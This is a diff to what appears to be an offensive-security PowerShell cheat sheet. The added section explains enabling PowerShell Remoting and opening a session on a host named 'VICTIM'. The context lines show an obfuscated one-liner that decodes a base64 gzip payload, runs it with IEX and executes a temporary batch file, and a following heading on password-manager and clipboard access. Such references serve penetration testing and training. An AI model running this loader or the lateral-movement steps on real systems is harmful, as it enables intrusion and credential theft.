@@ -94,6 +94,26 @@ cmd.exe /c powershell "'powershell ""$s=New-Object IO.MemoryStream(,[Convert]::F
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
 '""| out-file -filepath %tmp%\tmp9388.bat -encoding ascii; cmd /c '%tmp%\tmp9388.bat'
 ```
+
+## Enable PowerShell Remoting:
+
+Tip Provided By Joshua Wright:
+
+By default, Windows Server 2012R2 and later have PowerShell remote access turned on by default. Windows 10 and Windows 11 systems have this feature turned off by default. To turn on PowerShell remote access, an administrator can run the ```Enable-PSRemoting``` command:
+
+```
+PS C:\WINDOWS\system32> Enable-PSRemoting
+```
+
+With the appropriate permissions, remote access to PowerShell is straightforward: run Enter-PSSession and specify the target host name or IP address using -ComputerName:
+
+```
+PS C:\WINDOWS\system32> Enter-PSSession -ComputerName VICTIM
+[VICTIM]: PS C:\Users\Victim\Documents>
+```
+
+When you are done with your PowerShell remote session, run ```Exit-PSSession``` to return to your host system.
+
 ## PowerShell Password Manager and Clipboard Access:
 
 Password managers offer many benefits for selection and storage of passwords.
